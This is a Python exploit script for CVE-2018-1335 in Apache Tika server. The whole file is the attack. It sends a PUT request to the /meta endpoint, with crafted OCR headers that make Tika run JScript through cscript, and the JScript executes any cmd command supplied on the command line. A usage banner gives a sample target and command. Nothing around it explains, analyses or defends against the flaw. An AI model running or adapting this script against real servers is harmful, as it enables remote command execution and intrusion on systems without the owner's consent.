#!/usr/bin/python

import sys
import requests


data="""


  CVE-2018-1335                                                                          


python3 exploit.py


[+]usage:

python3 exploit.py <host> <port> <command>"	: syntax
python3 exploit.py 127.0.0.1 9998 calc.exe	: example



"""


if len(sys.argv) < 4:
	print(data)
else:
	host = sys.argv[1]
	port = str(sys.argv[2])
	cmmnd = sys.argv[3]

	url = host+":"+port+"/meta"

	headers = {"X-Tika-OCRTesseractPath": "\"cscript\"", 
		"X-Tika-OCRLanguage": "//E:Jscript", 
		"Expect": "100-continue", 
		"Content-type": "image/jp2", 
		"Connection": "close"}

	jscript ='''var oShell = WScript.CreateObject("WScript.Shell");
	var oExec = oShell.Exec('cmd /c {}');
	'''.format(cmmnd)

	try:
		requests.put("https://"+url, headers=headers, data = jscript , verify=False)
	
	except:
		try:
			requests.put("http://"+url, headers=headers, data= jscript )
		except:
			print ("Something went wrong.\nUsage: python3 exploit.py <host> <port> <command>")